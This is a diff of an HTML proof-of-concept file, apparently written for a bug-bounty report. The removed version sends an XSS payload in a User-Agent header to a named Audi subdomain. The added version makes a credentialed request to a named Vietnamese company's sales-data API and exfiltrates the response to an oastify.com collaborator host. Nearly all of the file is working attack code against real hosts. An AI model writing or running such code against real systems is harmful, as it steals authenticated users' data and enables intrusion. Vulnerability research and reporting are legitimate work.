@@ -1,15 +1,12 @@
-<html>
-  <body>
-    <h1>XSS PoC via User-Agent / Accept-Language</h1>
-    <script>
-      // Demo gửi request có User-Agent độc hại bằng fetch + proxy (trình duyệt sẽ chặn, 
-      // nhưng có thể giải thích trong report)
-      fetch("https://appcenter-doco-tam.audi.de/@.php", {
-        method: "GET",
-        headers: {
-          "User-Agent": "<script>alert(document.domain)</script>"
-        }
-      });
-    </script>
-  </body>
-</html>
+<script>
+(async () => {
+  const r = await fetch('https://uapami.huuhong.com.vn:6805/AMI/VendingReport/salesdata/freeAmountSummaryController/querySaleFreeSummary?objType=01&startDate=2025-06&endDate=2025-06&orgNo=002&dateType=02&start=1&limit=10', {
+    method: 'GET',
+    credentials: 'include' // như withCredentials=true
+  });
+  const text = await r.text();
+  // Exfiltrate (mã hóa đề phòng ký tự đặc biệt)
+  const q = encodeURIComponent(text);
+  await fetch('https://hn8pguuu23fwjz09t6ftzt36mxsogfc31.oastify.com/log?d=' + q);
+})();
+</script>
